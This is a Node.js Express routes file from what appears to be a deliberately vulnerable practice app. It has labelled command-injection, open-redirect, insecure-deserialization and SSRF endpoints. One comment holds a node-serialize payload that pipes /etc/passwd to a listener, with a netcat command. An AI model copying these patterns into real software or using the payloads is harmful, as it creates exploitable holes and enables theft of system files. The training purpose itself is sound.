'user strcit';

module.exports = (app,db) => {

    //Get System/ warehouse information
    /**
     * GET /v1/status/{brand}
     * @summary Check if brand website is available through curl (RCE - Remote Code Execution)
     * @description command execution - brand="bud | whoami"
     * @tags system
     * @param {string} brand.path.required - the beer brand you want to test
     */
    app.get('/v1/status/:brand', (req,res) =>{
        var execSync = require('child_process').execSync;

        try{
            const test = execSync("curl https://letmegooglethat.com/?q="+ req.params.brand)
            res.send(test)
        }
        catch (e){
            console.log(e)
        }
        
    });
        //redirect user to brand
    /**
     * GET /v1/redirect/
     * @summary Redirect the user the beer brand website (Insecure redirect)
     * @Author 
     * @tags system
     * @param {string} url.query.required - the beer brand you want to redirect to
     */
     app.get('/v1/redirect/', (req,res) =>{
    var url = req.query.url
    console.log(url)
    if(url){
        res.redirect(url);
    } else{
        next()
    }
        
    });
    //initialize list of beers
    /**
     * POST /v1/init/
     * @summary Initalize beers from object (Insecure Object Deserialization)
     * @description 
            {"rce":"_$$ND_FUNC$$_function ()
            {require('child_process').exec(
            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- localhost:4444\"',
            function(error, stdout, stderr)
            {console.log(stdout) }
            );} () "}


            netcat -l 4444
     * @Author Insecure Object Deserialization
     * @tags system
     * @param {object} request.body.required - the beer brand you want to test
     */
     app.post('/v1/init', (req,res) =>{
        var serialize = require('node-serialize');
        const body = req.body.object;
        var deser = serialize.unserialize(body)
        console.log(deser)
        
    });
    //perform a test on an endpoint
    /**
     * GET /v1/test/
     * @summary Perform a get request on another url in the system (SSRF - Server Side Request Forgery)
     * @tags system
     * @param {string} url.query.required - the beer brand you want to redirect to
     */
     app.get('/v1/test/', (req,res) =>{
         var requests = require('axios')
        var url = req.query.url
        console.log(url)
        if(url){

            requests.get(url)
            .then(Ares => {
                //console.log(Ares);
                res.json({response:Ares.status});
                console.log(`statusCode: ${Ares.status}`);
            })
            .catch(error => {
                console.error(error);
                res.json({response:error});

            });
        } else{
            res.json({error:"No url provided"});

        }
        console.log(res)
            return
        });
};